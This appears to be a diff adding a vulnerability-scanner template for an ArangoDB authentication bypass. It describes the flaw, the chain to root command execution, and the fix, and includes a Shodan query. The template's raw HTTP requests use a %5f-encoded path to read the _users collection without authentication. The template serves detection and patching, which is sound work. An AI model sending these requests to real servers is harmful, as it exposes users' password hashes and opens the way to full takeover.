@@ -1,0 +1,62 @@
+id: arangodb-auth-bypass
+
+info:
+  name: ArangoDB - Authentication Bypass via URL-Encoded Underscore (%5f) to RCE
+  author: DhiyaneshDk
+  severity: critical
+  description: |
+    ArangoDB <= 3.12.10.1 contains an authentication bypass in the default server.authentication-system-only=true mode (GHSA-rrgq-978q-36mq). The auth gate evaluates the raw URL while action dispatch uses URL-decoded suffixes. Encoding the leading underscore as %5f makes protected /_api/simple/* actions appear public to the auth gate but dispatches as privileged system actions, allowing unauthenticated read/write of the _users collection including password hashes.Chained with GHSA-rvhw-4hpw-9vrx (client-controlled isSystem:true in REST task creation), this yields root-context command execution in the official container image where arangod runs as UID 0.
+  impact: |
+    An unauthenticated attacker can read and modify database user credentials, and chain with task escalation to achieve remote code execution as root.
+  remediation: |
+    Upgrade to ArangoDB 3.12.11 or later. As interim mitigation, set --server.authentication-system-only=false so every route requires authentication.
+  reference:
+    - https://github.com/arangodb/arangodb/security/advisories/GHSA-rrgq-978q-36mq
+    - https://github.com/arangodb/arangodb/security/advisories/GHSA-rvhw-4hpw-9vrx
+    - https://www.pruva.dev/reproductions/REPRO-2026-00355
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-287
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: arangodb
+    product: arangodb
+    shodan-query: http.title:"ArangoDB Web Interface"
+  tags: arangodb,auth-bypass,rce,ghsa
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        PUT /_db/_system/_api/simple/first-example HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"collection":"_users","example":{}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 401'
+        internal: true
+
+  - raw:
+      - |
+        PUT /_db/_system/%5fapi/simple/first-example HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"collection":"_users","example":{}}
+
+    unsafe: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "\"document\"") && contains(body, "_users/") && contains(body, "\"error\":false")'
+          - 'status_code == 200'
+        condition: and
+# digest: 490a004630440220584094bcd30279b5b231bc65386ed73f8264210933de6dc6bef277d8161acc8402205e2fff66f431ecd6a9adb471ff20ca4cfee3998adb17ab6ccc30e7fb46774b5d:922c64590222798bb761d5b6d8e72950
